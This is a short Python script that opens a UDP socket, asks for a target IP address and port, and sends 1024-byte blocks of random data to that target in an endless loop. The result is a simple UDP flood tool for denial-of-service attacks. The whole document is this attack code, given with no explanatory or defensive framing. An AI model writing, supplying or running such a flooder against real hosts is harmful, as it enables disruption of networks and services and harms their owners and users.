import socket
import random

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
bytes=random._urandom(1024) 
ip=raw_input('IP: ') 
port=int(input('Port: '))

while True:
    sock.sendto(bytes,(ip,port))
